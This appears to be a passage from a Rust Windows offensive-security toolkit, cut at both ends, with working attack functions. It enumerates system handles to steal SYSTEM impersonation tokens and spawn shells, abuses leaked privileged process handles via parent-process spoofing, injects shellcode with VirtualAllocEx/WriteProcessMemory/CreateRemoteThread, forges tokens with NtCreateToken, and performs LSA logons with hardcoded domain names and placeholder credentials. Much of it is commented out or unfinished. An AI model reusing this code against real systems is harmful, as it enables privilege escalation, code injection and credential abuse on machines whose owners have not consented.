}











pub fn getalltokenhandles(){

    unsafe{



        let mut i =0;

        let mut bytesneeded = 0;

       

        let mut buffer = loop{

           

            let mut buffer = vec![0u8;bytesneeded as usize];

            let ntstatus2 =  NtQuerySystemInformation(SystemHandleInformation,

                buffer.as_mut_ptr() as *mut c_void,

                bytesneeded,

                &mut bytesneeded);



                //println!("bytes needed: {}",bytesneeded);





                if NT_SUCCESS(ntstatus2)  {

                    break buffer;

                }

                if  !NT_SUCCESS(ntstatus2){

                    //println!("NtQuerySystemInformation failed: {}",ntstatus2);

                    i+=1;

                }   

        };



       println!("bytesneeded: {}",bytesneeded);

       

       

        let  handleinfo = *(buffer.as_mut_ptr() as *mut SYSTEM_HANDLE_INFORMATION);



        println!("number of handles: {}",handleinfo.NumberOfHandles);

       



        println!("size of handle table entry info: {}",

        std::mem::size_of::<SYSTEM_HANDLE_TABLE_ENTRY_INFO>());



        for i in 0..handleinfo.NumberOfHandles{

            let tableentry = *((buffer.as_mut_ptr() as usize + 8 +

            (i as usize * std::mem::size_of::<SYSTEM_HANDLE_TABLE_ENTRY_INFO>()))

             as *mut SYSTEM_HANDLE_TABLE_ENTRY_INFO);





           



            let prochandle = OpenProcess(PROCESS_DUP_HANDLE

                |PROCESS_QUERY_INFORMATION , 0, tableentry.UniqueProcessId as u32);

            if prochandle.is_null(){

                //println!("openprocessfailed: {}",GetLastError());

                continue;

            }

            //println!("prochandle: {:x?}",prochandle);



            let mut duphandle = 0 as *mut c_void;

            let res = DuplicateHandle(prochandle,

                tableentry.HandleValue as *mut c_void,

                GetCurrentProcess(),

                &mut duphandle,

                0, 0, DUPLICATE_SAME_ACCESS);

            //println!("duphandle: {:x?}",duphandle);

            if res==0{

                //println!("duplicatehandle failed: {}",GetLastError());

                CloseHandle(prochandle);

                continue;

            }



           



            let mut reqlength = 0;

            let mut objinfo = vec![0u8;reqlength as usize];

            let ntstatus = NtQueryObject(duphandle,

                2,

                objinfo.as_mut_ptr() as *mut c_void,

                objinfo.len() as u32,

                &mut reqlength);



            //println!("{:x?}",ntstatus);

            if reqlength == 0{

                continue;

            }



            let mut objinfo = vec![0u8;reqlength as usize];

            //println!("req length: {}",reqlength);

            let ntstatus = NtQueryObject(duphandle,

                2,

                objinfo.as_mut_ptr() as *mut c_void,

                objinfo.len() as u32,

                &mut reqlength);



            let typeinfo = *(objinfo.as_mut_ptr() as *mut OBJECT_TYPE_INFORMATION);



            let typename = unicodetostring(&typeinfo.TypeName,

                    GetCurrentProcess());

               

                if typename.contains("Token"){

                     

                    let res1 = gettokenuserinfo(tableentry.HandleValue as *mut c_void) ;     

                    if res1.is_ok(){



                        let mut newtokenhandle = 0 as *mut c_void;

                        let res2 = OpenProcessToken(prochandle,

                            TOKEN_DUPLICATE, &mut newtokenhandle);

                       

                        if res2==0{

                            continue;

                        }





                        println!("uniqueprocessid: {}",tableentry.UniqueProcessId);

                        println!("handle value: {:x?}",tableentry.HandleValue);

                        println!("object: {:x?}",tableentry.Object);

                        println!("typename: {}",typename); 

                       

                        gettokenstatistics(duphandle as *mut c_void);

                        println!("{}",res1.clone().ok().unwrap());

                        if res1.ok().unwrap().to_string().contains("SYSTEM"){

                            if isimpersonatedtoken(duphandle){

                                duplicatetokenandspawn(tableentry.HandleValue as *mut c_void );

                                break;

                            }

                           



                        }

                        println!();

                   

                    }

               

                }



                CloseHandle(prochandle);

                //break;



        }









       



    }

}





pub fn createvulnprochandle(){

    unsafe{



        // this function running as higher privileges

        let selfprochandle = GetCurrentProcess();



        println!("system cmd my pid: {}",GetCurrentProcessId());



        // opening explorer.exe as it runs as normal user

        let explorerhandle = OpenProcess(PROCESS_ALL_ACCESS, 1, 8204);

        println!("explorerhandle: {:x?}",explorerhandle);





        let winlogonhandle =OpenProcess(PROCESS_ALL_ACCESS,1,1292);

        println!("system cmd handle: {:x?}",winlogonhandle);



        let mut usertoken =  0 as *mut c_void;

        let mut clonedtoken = 0 as *mut c_void;

        OpenProcessToken(explorerhandle, TOKEN_ALL_ACCESS,&mut usertoken );

        /*DuplicateTokenEx(usertoken, TOKEN_ALL_ACCESS,

            std::ptr::null_mut(),

            3, 1, &mut clonedtoken);

*/

       

        let mut sinfo = std::mem::zeroed::<STARTUPINFOW>();

        sinfo.cb = std::mem::size_of::<STARTUPINFOW>() as u32;

        let mut pinfo = std::mem::zeroed::<PROCESS_INFORMATION>();



        // creating new process with inherit handles true

        // makes all our handles exposed to child process

            CreateProcessAsUserW(usertoken,

                "C:\\Windows\\System32\\cmd.exe\0".encode_utf16().collect::<Vec<u16>>().as_mut_ptr() as *mut u16,

                std::ptr::null_mut(),

                std::ptr::null_mut(),

                std::ptr::null_mut(),

                1,

                0,

                std::ptr::null_mut(),

                std::ptr::null_mut(),

                &mut sinfo, &mut pinfo);



                //CloseHandle(explorerhandle);



                println!("new child process pid: {}",pinfo.dwProcessId);



                Sleep(0xFFFFFFFF);



    }

}





pub fn getvulnprocesshandles(){

    unsafe{



        let mut i =0;

        let mut bytesneeded = 0;

       

        let mut buffer = loop{

           

            let mut buffer = vec![0u8;bytesneeded as usize];

            let ntstatus2 =  NtQuerySystemInformation(SystemHandleInformation,

                buffer.as_mut_ptr() as *mut c_void,

                bytesneeded,

                &mut bytesneeded);



                //println!("bytes needed: {}",bytesneeded);





                if NT_SUCCESS(ntstatus2)  {

                    break buffer;

                }

                if  !NT_SUCCESS(ntstatus2){

                    //println!("NtQuerySystemInformation failed: {}",ntstatus2);

                    i+=1;

                }   

        };



        println!("bytesneeded: {}",bytesneeded);

       

       

        let  handleinfo = *(buffer.as_mut_ptr() as *mut SYSTEM_HANDLE_INFORMATION);



        println!("number of handles: {}",handleinfo.NumberOfHandles);



        let allprochandles = getallprochandles().unwrap();

       

       

        let mut tableentries:Vec<SYSTEM_HANDLE_TABLE_ENTRY_INFO> = Vec::new();

        for i in 0..handleinfo.NumberOfHandles  {



            let tableentry = *(((buffer.as_mut_ptr() as usize + 8 + (i as usize

                * std::mem::size_of::<SYSTEM_HANDLE_TABLE_ENTRY_INFO>())))as *mut SYSTEM_HANDLE_TABLE_ENTRY_INFO);

       

            tableentries.push(tableentry.clone());

           

        }



       



        let procaddresshandles = tableentries.clone();

       



        let mut pids = vec![0u16;1000];

       

       



        for i in 0..tableentries.len(){



             

            if tableentries[i].ObjectTypeIndex !=0x7{

                continue;

            }



            /*if tableentries[i].UniqueProcessId == 22444 ||tableentries[i].UniqueProcessId==13792 {

                println!("process id of low priv process: {}",tableentries[i].UniqueProcessId);

                println!("object address: {:x?}",tableentries[i].Object);

                println!("handle value: {:x?}",tableentries[i].HandleValue);

                println!("granted access: {:x?}",tableentries[i].GrantedAccess);

            }*/

            if tableentries[i].UniqueProcessId == GetCurrentProcessId() as u16{

                continue;

            }



            /*if tableentries[i].GrantedAccess == 0x0012019f

                && tableentries[i].GrantedAccess != 0x00120189

                && tableentries[i].GrantedAccess != 0x120089

                && tableentries[i].GrantedAccess != 0x1A019F{

                    continue;

                }*/



            if tableentries[i].GrantedAccess!=PROCESS_ALL_ACCESS

           

            {

                continue;

            }

           



            let phandle = OpenProcess(PROCESS_ALL_ACCESS, 0,tableentries[i].UniqueProcessId as u32);

            if phandle.is_null(){

                continue;

            }

            CloseHandle(phandle);

           



            for j in 0..procaddresshandles.len(){

                if procaddresshandles[j].UniqueProcessId==tableentries[i].UniqueProcessId{

                    continue;

                }

                if procaddresshandles[j].ObjectTypeIndex!=0x7{

                    continue;

                }

                if procaddresshandles[j].GrantedAccess!=PROCESS_ALL_ACCESS

                {

                    continue;

                }



                if procaddresshandles[j].UniqueProcessId ==4||

                procaddresshandles[j].UniqueProcessId ==1232

                ||procaddresshandles[j].UniqueProcessId ==16556{

                    continue

                }



               

               



                if procaddresshandles[j].Object as usize== tableentries[i].Object as usize{

                    let prochandle = OpenProcess(PROCESS_ALL_ACCESS, 0,procaddresshandles[j].UniqueProcessId as u32);

                    if prochandle.is_null(){

                        println!("our equal level processid: {}: {}",tableentries[i].UniqueProcessId,procaddresshandles[j].UniqueProcessId);

                        println!("our equal level process handle value: {:x?}",tableentries[i].HandleValue);

                        println!("phandle: {:x?}",phandle);

                        println!("our equal level object: {:x?}",tableentries[i].Object);

                        println!("our granted access: {:x?}",tableentries[j].GrantedAccess);

                        println!("other process id: {}",procaddresshandles[j].UniqueProcessId);

                        println!("other granted access: {:x?}",procaddresshandles[j].GrantedAccess);

                       

                        pids.push(tableentries[i].UniqueProcessId);

                        /*for (k,v) in &allprochandles{

                            if *v as usize==procaddresshandles[j].HandleValue as usize{

                                println!("{}: {:x?}",k,*v as usize);

                            }

                        }*/

                        //continue;

                        let phandle = OpenProcess(PROCESS_DUP_HANDLE, 0, tableentries[i].UniqueProcessId as u32);

                        if phandle.is_null(){

                            continue;

                        }

                        let mut clonedhandle = 0 as *mut c_void;

                        let res = DuplicateHandle(phandle, tableentries[i].HandleValue as *mut c_void, GetCurrentProcess(), &mut clonedhandle, 0, 0, DUPLICATE_SAME_ACCESS);

                        if res == 0{

                            println!("duplicatehandle failed: {}",GetLastError());

                            CloseHandle(phandle);

                            CloseHandle(clonedhandle);

                            println!();

                            continue;

                        }

                        println!("clonedhandle: {:x?}",clonedhandle);

                        CloseHandle(clonedhandle);

                        CloseHandle(phandle);

                        continue;

                        /*shellcodeinject(clonedhandle);

                        CloseHandle(phandle);

                        CloseHandle(clonedhandle);

                        continue;*/

                        /*if tableentries[i].HandleValue!=0xc8 &&

                            procaddresshandles[j].UniqueProcessId!=31500{

                            CloseHandle(phandle);

                            CloseHandle(clonedhandle);

                            println!();

                            continue;

                        }*/

                       

                        let mut sizeneeded = 0;

                        InitializeProcThreadAttributeList(std::ptr::null_mut(), 1, 0,&mut sizeneeded );



                        println!("sizeneeded: {}",sizeneeded);

                        let mut plist = vec![0u8;sizeneeded];

                        InitializeProcThreadAttributeList(plist.as_mut_ptr() as *mut PROC_THREAD_ATTRIBUTE_LIST, 1, 0,&mut sizeneeded );



                        let updateres = UpdateProcThreadAttribute(plist.as_mut_ptr() as *mut PROC_THREAD_ATTRIBUTE_LIST,

                             0,

                             0x00020000|0,

                             clonedhandle,

                             4,

                             std::ptr::null_mut(),

                             std::ptr::null_mut());

                        println!("updateprocthreadresult: {}",res);

                         let mut sinfo = std::mem::zeroed::<STARTUPINFOEXW>();

                         sinfo.StartupInfo.cb = std::mem::size_of::<STARTUPINFOEXW>() as u32;

                         sinfo.lpAttributeList = plist.as_mut_ptr() as *mut PROC_THREAD_ATTRIBUTE_LIST;



                        let mut pinfo = std::mem::zeroed::<PROCESS_INFORMATION>();



                        let res = CreateProcessW("C:\\Windows\\System32\\cmd.exe\0".encode_utf16().collect::<Vec<u16>>().as_mut_ptr() as *mut u16,

                             std::ptr::null_mut(),

                             std::ptr::null_mut(),

                             std::ptr::null_mut(),

                             1,

                             EXTENDED_STARTUPINFO_PRESENT|CREATE_NEW_CONSOLE,

                             std::ptr::null_mut(),

                             std::ptr::null_mut(),

                             &mut sinfo.StartupInfo,

                              &mut pinfo);

                   

                        if res==0{

                            println!("createprocessw failed: {}",GetLastError());

                            CloseHandle(phandle);

                            CloseHandle(clonedhandle);

                            println!();

                            continue;

                        }

                        println!("child pid: {}",pinfo.dwProcessId);

                        CloseHandle(pinfo.hProcess);

                        CloseHandle(pinfo.hThread);



                        CloseHandle(phandle);

                        CloseHandle(clonedhandle);

                        println!();

                        continue;

                    }

                   

                   

                   

                   

                }



            }



           



            /*let mut prochandle = 0 as *mut c_void;

            prochandle = OpenProcess(PROCESS_QUERY_INFORMATION|PROCESS_DUP_HANDLE, 0, tableentries[i].UniqueProcessId as u32);

            if prochandle.is_null() {

                //println!("prochandle: {:x?}",prochandle);

                // we dont want higher privileged processes

                continue;

            }



            //println!("enumerating");

            // checking handles of low privileged process,

            // checking if it has any interesting handles

            if tableentries[i].GrantedAccess == PROCESS_ALL_ACCESS ||

            tableentries[i].GrantedAccess == PROCESS_CREATE_PROCESS ||

            tableentries[i].GrantedAccess == PROCESS_DUP_HANDLE ||

            tableentries[i].GrantedAccess == PROCESS_CREATE_THREAD||

            tableentries[i].GrantedAccess == PROCESS_VM_WRITE{



                // now we check the process of that handle

                for j in 0..process1handles.len(){

                    if process1handles[j].ObjectTypeIndex!=0x7{

                        continue;

                    }

                    if process1handles[j].UniqueProcessId==tableentries[i].UniqueProcessId{

                        continue;

                    }



                    if tableentries[i].Object == process1handles[j].Object{

                        let handle1 = process1handles[j].HandleValue;

                        for (k,v) in &allprochandles{

                            if handle1 == *v as u16{

                                let mut proc1handle = 0 as *mut c_void;

                                proc1handle = OpenProcess(PROCESS_ALL_ACCESS, 0, *k);

                                if  proc1handle.is_null(){

                                    println!("you might wanna check this process out");

                                    println!("process id of low priv process: {}",tableentries[i].UniqueProcessId);

                                    println!("object address: {:x?}",tableentries[i].Object);

                                    println!("handle value: {:x?}",tableentries[i].HandleValue);

                                    println!("granted access: {:x?}",tableentries[i].GrantedAccess);

                                    println!("objectaddress: {:x?}",process1handles[j].Object);

                                    println!("handle value j: {:x?}",process1handles[j].HandleValue);

                                    println!("Process id: {}",k);

                                    println!("handle: {:x?}",v);

                                   



                                    /*let proc2handle = OpenProcess(tableentries[i].GrantedAccess, 0, tableentries[i].UniqueProcessId as u32);

                                    //println!("proc2handle: {:x?}, getlasterror: {}",proc2handle,GetLastError());

                                    if proc2handle.is_null(){

                                        continue;

                                    }

                                    println!("proc2handle: {:x?}",proc2handle);*/

                                    let mut targethandle = 0 as *mut c_void;

                                    DuplicateHandle(prochandle, prochandle, GetCurrentProcess(), &mut targethandle, 0, 0, DUPLICATE_SAME_ACCESS);

                                    if targethandle.is_null(){

                                        println!("duplicatehandle failed: {}",GetLastError());

                                    }

                                    /*let mut token2handle = 0 as *mut c_void;

                                     OpenProcessToken(proc2handle, TOKEN_ALL_ACCESS, &mut token2handle);

                                    duplicatetokenandspawn(token2handle);*/

                                    //CloseHandle(proc2handle);

                                    println!("");

                                }

                                CloseHandle(proc1handle);

                               



                            }

                        }

                    }*/







        }

        println!("{:?}",pids.into_iter().unique().collect::<Vec<u16>>());



            /*if tableentry.GrantedAccess == PROCESS_ALL_ACCESS ||

                tableentry.GrantedAccess == PROCESS_CREATE_PROCESS ||

                tableentry.GrantedAccess == PROCESS_DUP_HANDLE ||

                tableentry.GrantedAccess == PROCESS_CREATE_THREAD||

                tableentry.GrantedAccess == PROCESS_VM_WRITE{



               



                if tableentry.UniqueProcessId == GetCurrentProcessId() as u16{

                    continue;

                }







                    println!("Process ID: {}",tableentry.UniqueProcessId);

                    println!("Handle Value: {:x?}",tableentry.HandleValue);

                    println!("Object: {:x?}",tableentry.Object);

                    println!("Granted Access: {:x?}",tableentry.GrantedAccess);

                    println!();*/



                /*let prochandle = OpenProcess(PROCESS_QUERY_LIMITED_INFORMATION, 0, tableentry.UniqueProcessId as u32);

                if prochandle.is_null(){

                    //println!("Openprocessfailed: {}",GetLastError());

                    continue;

                }

                let mut tokenhandle = 0 as *mut c_void;

                let res = OpenProcessToken(prochandle, TOKEN_QUERY, &mut tokenhandle);

                if tokenhandle ==0 as *mut c_void{

                    CloseHandle(prochandle);

                    continue;

                }



                let res = gettokenintegritylevel(tokenhandle);

                if res.is_err(){

                    continue;

                }



               



                let integritylevel = res.ok().unwrap();

                if integritylevel.to_lowercase().contains("high mandatory level") ||

                integritylevel.to_lowercase().contains("high mandatory level") {

                    println!("Process ID: {}",tableentry.UniqueProcessId);

                    println!("Handle Value: {:x?}",tableentry.HandleValue);

                    println!("Object: {:x?}",tableentry.Object);

                    println!("Granted Access: {:x?}",tableentry.GrantedAccess);

                    println!("Process integrity level: {}",integritylevel);

                    println!("{}", gettokenuserinfo(tokenhandle).unwrap());

                    println!();

                }   */

               



        /*for i in 0..tableentries.len(){

            if tableentries[i].ObjectTypeIndex!=0x7{

                continue;

            }

            let tempobjectaddress = tableentries[i].Object;



            for j in 0..tableentries.len(){

                if process1handles[j].UniqueProcessId == tableentries[i].UniqueProcessId{

                    continue;

                }

                if tableentries[i].GrantedAccess != PROCESS_ALL_ACCESS ||

            tableentries[i].GrantedAccess != PROCESS_CREATE_PROCESS ||

            tableentries[i].GrantedAccess != PROCESS_DUP_HANDLE ||

            tableentries[i].GrantedAccess != PROCESS_CREATE_THREAD||

            tableentries[i].GrantedAccess != PROCESS_VM_WRITE{



            }



                if process1handles[j].Object == tempobjectaddress{

                    println!("----------------------");

                    println!("Process ID: {}",tableentries[i].UniqueProcessId);

                        println!("Handle Value: {:x?}",tableentries[i].HandleValue);

                        println!("Object: {:x?}",tableentries[i].Object);

                        println!("Granted Access: {:x?}",tableentries[i].GrantedAccess);

                       



                    println!("Process ID: {}",process1handles[j].UniqueProcessId);

                        println!("Handle Value: {:x?}",process1handles[j].HandleValue);

                        println!("Object: {:x?}",process1handles[j].Object);

                        println!("Granted Access: {:x?}",process1handles[j].GrantedAccess);

                        println!("----------------------");

                        println!();

                }



            }



            /*if tableentries[i].GrantedAccess == PROCESS_ALL_ACCESS ||

            tableentries[i].GrantedAccess == PROCESS_CREATE_PROCESS ||

            tableentries[i].GrantedAccess == PROCESS_DUP_HANDLE ||

            tableentries[i].GrantedAccess == PROCESS_CREATE_THREAD||

            tableentries[i].GrantedAccess == PROCESS_VM_WRITE{

                if tableentries[2].Object == tableentries[i].Object{

                    println!("Process ID: {}",tableentries[i].UniqueProcessId);

                        println!("Handle Value: {:x?}",tableentries[i].HandleValue);

                        println!("Object: {:x?}",tableentries[i].Object);

                        println!("Granted Access: {:x?}",tableentries[i].GrantedAccess);

                        println!();

                }

            }*/

           

        }*/

           

           

       





       

        }



   



   

}







pub fn kerberoscache(){

    unsafe{



       



    }

}





pub fn shellcodeinject(prochandle: *mut c_void){

    unsafe{



        let shellcode = [];

        let remotebase =   VirtualAllocEx(prochandle, std::ptr::null_mut(),

               shellcode.len() ,

               MEM_RESERVE|MEM_COMMIT, PAGE_EXECUTE_READWRITE);

   

        if remotebase.is_null(){

            println!("virtualallocex failed: {}",GetLastError());

            return ();

        }

   

        let mut byteswritten = 0;

        WriteProcessMemory(prochandle, remotebase,

            shellcode.as_ptr() as *const c_void,

            shellcode.len(), &mut byteswritten);



        let mut threadid = 0;

        let threadhandle = CreateRemoteThread(prochandle,

            std::ptr::null_mut(),

            0,

            std::mem::transmute(remotebase),

            std::ptr::null_mut(),

            0, &mut threadid);

            WaitForSingleObject(threadhandle, 0xFFFFFFFF);

    }



}







pub fn logonuser(){

    unsafe{



        let mut si = std::mem::zeroed::<STARTUPINFOW>();

        si.cb = std::mem::size_of::<STARTUPINFOW>() as u32;



        let mut pi = std::mem::zeroed::<PROCESS_INFORMATION>();



        let res = CreateProcessWithLogonW("Administrator\0".encode_utf16().collect::<Vec<u16>>().as_mut_ptr() as *mut u16,

        "theos.com.mx\0".encode_utf16().collect::<Vec<u16>>().as_mut_ptr() as *mut u16,

        "mypassword\0".encode_utf16().collect::<Vec<u16>>().as_mut_ptr() as *mut u16,

         1,

         std::ptr::null_mut(),

         "cmd.exe\0".encode_utf16().collect::<Vec<u16>>().as_mut_ptr() as *mut u16,

         

         CREATE_NEW_CONSOLE,

          std::ptr::null_mut(),

          std::ptr::null_mut(),

          &mut si, &mut pi);

       



        if res==0{

            println!("CreateProcessWithLogonW failed: {}",GetLastError());

            return ();

        }



        /*let mut tokenhandle = 0 as *mut c_void;

        let res = LogonUserA("test2\0".as_bytes().as_ptr() as *const i8,

        "theos.com.mx\0".as_bytes().as_ptr() as *const i8,

        "mypass\0".as_bytes().as_ptr() as *const i8,

        LOGON32_LOGON_NEW_CREDENTIALS,

        LOGON32_PROVIDER_WINNT50,

         &mut tokenhandle);



        if res==0{

            println!("LogonUserA failed: {}",GetLastError());

            return ();

        }





        let mut sinfo = std::mem::zeroed::<STARTUPINFOW>();

        sinfo.cb = std::mem::size_of::<STARTUPINFOW>() as u32;

        let mut pinfo = std::mem::zeroed::<PROCESS_INFORMATION>();





        duplicatetokenandspawn(tokenhandle);

        return ();



       



        let mut newtokenhandle = 0 as *mut c_void;

        let res = DuplicateTokenEx(tokenhandle,

            0,

            std::ptr::null_mut(),

            2,

            1, &mut newtokenhandle);

        if res==0{

            println!("DuplicateTokenEx failed: {}",GetLastError());

            return ();

        }



     

       

        let res =CreateProcessAsUserW(tokenhandle,

                "C:\\Windows\\System32\\cmd.exe\0".encode_utf16().collect::<Vec<u16>>().as_mut_ptr() as *mut u16,

                std::ptr::null_mut(),

                std::ptr::null_mut(),

                std::ptr::null_mut(),

                0,

                0,

                std::ptr::null_mut(),

                std::ptr::null_mut(),

                &mut sinfo, &mut pinfo);



                //CloseHandle(explorerhandle);

                if res==0{

                    println!("createprocessasuserw failed: {}",GetLastError());

                    return ();

                }

                println!("new child process pid: {}",pinfo.dwProcessId);

*/





    }

}









pub fn createnewtoken(tokenhandle: *mut c_void){

    unsafe{





        let tokenstats = gettokenstatistics(tokenhandle);



        let mut objectname = "mynewtoken".encode_utf16().collect::<Vec<u16>>();

        let mut oname = std::mem::zeroed::<UNICODE_STRING>();

        oname.Buffer = objectname.as_mut_ptr() as *mut u16;

        oname.Length =  (objectname.len()*2) as u16 ;

        oname.MaximumLength = oname.Length + 1;





        let mut qos = std::mem::zeroed::<SECURITY_QUALITY_OF_SERVICE>();

        qos.Length = std::mem::size_of::<SECURITY_QUALITY_OF_SERVICE>() as u32;

        qos.ImpersonationLevel = SecurityImpersonation;

        qos.ContextTrackingMode = SECURITY_DYNAMIC_TRACKING;



        let mut oa = std::mem::zeroed::<OBJECT_ATTRIBUTES>();

        oa.Length = std::mem::size_of::<OBJECT_ATTRIBUTES>() as u32;

        //oa.RootDirectory = std::ptr::null_mut();

        //oa.ObjectName = &mut oname;

        //oa.Attributes = OBJ_CASE_INSENSITIVE;

        //oa.SecurityDescriptor = std::ptr::null_mut();

        oa.SecurityQualityOfService = &mut qos as *mut _ as *mut c_void;



       



        // generating a unique luid for auth id

        let mut luid = tokenstats.AuthenticationId;

        let ntstatus = NtAllocateLocallyUniqueId(&mut luid);

        if ntstatus != STATUS_SUCCESS{

            println!("NtAllocateLocallyUniqueId failed, exiting: {:x?}",ntstatus);

            return ();

        }





        let mut lt = tokenstats.ExpirationTime;







        let mut tokenuser = std::mem::zeroed::<TOKEN_USER>();

        tokenuser.User.Sid = getsidfromusername("soraimx\\michredteam\0".to_string()).as_mut_ptr() as *mut c_void;



       

       let groupvec = vec!["BUILTIN\\Users\0"];

        let mut groups = getsidattributesfromnames(&groupvec);

        let mut tokengroups:Vec<u8> = vec![0u8;(4 + std::mem::size_of::<SID_AND_ATTRIBUTES>() * groupvec.len()) as usize] ;

        std::ptr::write(tokengroups.as_mut_ptr() as *mut u32, groupvec.len() as u32);

        for i in 0..groups.len(){

            std::ptr::write(((tokengroups.as_mut_ptr() as usize

            + 4 +(i as usize *std::mem::size_of::<SID_AND_ATTRIBUTES>()))

            as *mut SID_AND_ATTRIBUTES ), groups[i]);

        }



        //let mut tokengroups = std::mem::zeroed::<TOKEN_GROUPS>();

        //tokengroups.GroupCount = 1;

        //tokengroups.Groups[0] =  *(groups.as_mut_ptr() as *mut SID_AND_ATTRIBUTES);

        //tokengroups.Groups[0].Sid = getsidfromusername("tech69\\Domain Admins\0".to_string()).as_mut_ptr() as *mut c_void;

        //tokengroups.Groups[0].Attributes = SE_GROUP_ENABLED_BY_DEFAULT;





        let  privvec = vec!["SeRestorePrivilege\0","SeBackupPrivilege\0","SeShutdownPrivilege\0","SeChangeNotifyPrivilege\0","SeUndockPrivilege\0","SeImpersonatePrivilege\0"];

        let mut privs = getluidsfromprivilegenames(&privvec);

       

        let mut tokenprivs =  vec![0u8;(4 + std::mem::size_of::<LUID_AND_ATTRIBUTES>() * privvec.len()) as usize] ;

        for i in 0..privs.len(){

            std::ptr::write(((tokenprivs.as_mut_ptr() as usize

            + 4 +(i as usize *std::mem::size_of::<LUID_AND_ATTRIBUTES>()))

            as *mut LUID_AND_ATTRIBUTES ), privs[i]);

        }

       

        //tokenprivs.PrivilegeCount = 1;

       // tokenprivs.Privileges[0] = *(privs.as_mut_ptr() as *mut LUID_AND_ATTRIBUTES);





        let mut tokenowner = std::mem::zeroed::<TOKEN_OWNER>();

        tokenowner.Owner = getsidfromusername("soraimx\\michredteam\0".to_string()).as_mut_ptr() as *mut c_void;

       



        let mut primarygroup = std::mem::zeroed::<TOKEN_PRIMARY_GROUP>();

        primarygroup.PrimaryGroup = getsidfromusername("soraimx\\michredteam\0".to_string()).as_mut_ptr() as *mut c_void;



        let mut tokensource = std::mem::zeroed::<TOKEN_SOURCE>();

        tokensource.SourceName = (*b"User32\0\0").map(|u| u as i8);

        //tokensource.SourceIdentifier = std::mem::zeroed::<LUID>();





        let mut tokenhandle = 0 as *mut c_void;

        let ntstatus = NtCreateToken(&mut tokenhandle,

            TOKEN_ALL_ACCESS,

            &mut oa,

            TokenImpersonation,

           &mut luid ,

            &mut lt,

            &mut tokenuser,

            tokengroups.as_mut_ptr() as *mut TOKEN_GROUPS,

             tokenprivs.as_mut_ptr() as *mut TOKEN_PRIVILEGES,

             &mut tokenowner,

              &mut primarygroup,

              std::ptr::null_mut(),

               &mut tokensource);



        println!("ntstatus: {:x?}",ntstatus);

            println!("tokenhandle : {:x?}",tokenhandle);

    }

}









pub fn msv10auth(){

    unsafe{

       



        let mut lsahandle = 0 as *mut c_void;

        //let mut secmode = 0;

        //let mut lsastring = mylsastring::new("User32LogonProcess");

        let ntstatus = LsaConnectUntrusted(&mut lsahandle);

        if ntstatus!=STATUS_SUCCESS{

            println!("LsaRegisterLogonProcess failed: {:x?}",ntstatus);

            return ();

        }





        let mut kerberos = mylsastring::new("MSV1_0");

        let mut packagehandle = 0;

        let ntstatus = LsaLookupAuthenticationPackage(lsahandle,

            &mut kerberos as *mut _ as *mut LSA_STRING,

             &mut packagehandle);

        if ntstatus!=STATUS_SUCCESS{

            println!("LsaLookupAuthenticationPackage failed: {:x?}",ntstatus);

            LsaDeregisterLogonProcess(lsahandle);

            return ();

        }





        let mut ilogon = std::mem::zeroed::<MSV1_0_INTERACTIVE_LOGON>();

        ilogon.MessageType = MsV1_0InteractiveLogon;

       

        let mut username = std::mem::zeroed::<UNICODE_STRING>();

        let mut usernamebuffer = "test1".encode_utf16().collect::<Vec<u16>>();

        username.Buffer = usernamebuffer.as_mut_ptr() as *mut u16;

        username.Length = usernamebuffer.len() as u16;

        username.MaximumLength = usernamebuffer.len() as u16 + 1;





        let mut password = std::mem::zeroed::<UNICODE_STRING>();

        let mut passwordbuffer = "HASHHERE".encode_utf16().collect::<Vec<u16>>();

        password.Buffer = passwordbuffer.as_mut_ptr() as *mut u16;

        password.Length = passwordbuffer.len() as u16;

        password.MaximumLength = passwordbuffer.len() as u16 + 1;







        let mut domain = std::mem::zeroed::<UNICODE_STRING>();

        let mut domainbuffer = "theos.com.mx".encode_utf16().collect::<Vec<u16>>();

        domain.Buffer = domainbuffer.as_mut_ptr() as *mut u16;

        domain.Length = domainbuffer.len() as u16;

        domain.MaximumLength = domainbuffer.len() as u16 + 1;



        ilogon.UserName = std::mem::transmute(username);

        ilogon.Password = std::mem::transmute(password);

        ilogon.LogonDomainName = std::mem::transmute(domain);





        let mut tokensource = std::mem::zeroed::<TOKEN_SOURCE>();

        tokensource.SourceName = (*b"User32\0\0").map(|u| u as i8);

        tokensource.SourceIdentifier = std::mem::zeroed::<LUID>();





        let mut origin = std::mem::zeroed::<LSA_STRING>();

        let mut buffer3 = "Testingorigin".bytes().collect::<Vec<u8>>();

        origin.Length = buffer3.len() as u16;

        origin.MaximumLength = buffer3.len() as u16+1;

        origin.Buffer = buffer3.as_mut_ptr() as *mut i8;





        let mut profilebuf = 0 as *mut c_void;

        let mut profilebuflength = 0;

        let mut luid = std::mem::zeroed::<LUID>();

        let mut tokenhandle = 0 as *mut c_void;

        let mut quota = std::mem::zeroed::<QUOTA_LIMITS>();

        let mut logonstatus = 0;

        let ntstatus = LsaLogonUser(lsahandle,

           &mut origin ,

            2,

            packagehandle,

             &mut ilogon as *mut _ as *mut c_void,

             std::mem::size_of::<MSV1_0_INTERACTIVE_LOGON>() as u32,

              std::ptr::null_mut(),

              &mut tokensource,

             &mut profilebuf ,

             &mut profilebuflength,

             &mut luid,

             &mut tokenhandle,

             &mut quota, &mut logonstatus);



        println!("logon status: {:x?}",logonstatus);

        if ntstatus!=STATUS_SUCCESS{

            println!("LsaLogonUser failed: {:x?}",ntstatus);

            LsaDeregisterLogonProcess(lsahandle);

            return ();

        }



        LsaFreeMemory(profilebuf);



        LsaDeregisterLogonProcess(lsahandle);









    }

}







pub fn kerbinteractivelogon(){

    unsafe{





        let mut lsahandle = 0 as *mut c_void;

        //let mut secmode = 0;

        //let mut lsastring = mylsastring::new("User32LogonProcess");

        let ntstatus = LsaConnectUntrusted(&mut lsahandle);

        if ntstatus!=STATUS_SUCCESS{

            println!("LsaRegisterLogonProcess failed: {:x?}",ntstatus);

            return ();

        }





        let mut kerberos = mylsastring::new("Kerberos");

        let mut packagehandle = 0;

        let ntstatus = LsaLookupAuthenticationPackage(lsahandle,

            &mut kerberos as *mut _ as *mut LSA_STRING,

             &mut packagehandle);

        if ntstatus!=STATUS_SUCCESS{

            println!("LsaLookupAuthenticationPackage failed: {:x?}",ntstatus);

            LsaDeregisterLogonProcess(lsahandle);

            return ();

        }











        let mut ilogon = std::mem::zeroed::<KERB_INTERACTIVE_LOGON>();

        ilogon.MessageType = KerbInteractiveLogon;



        let mut username = std::mem::zeroed::<UNICODE_STRING>();

        let mut usernamebuffer = "test1".encode_utf16().collect::<Vec<u16>>();

        username.Buffer = usernamebuffer.as_mut_ptr() as *mut u16;

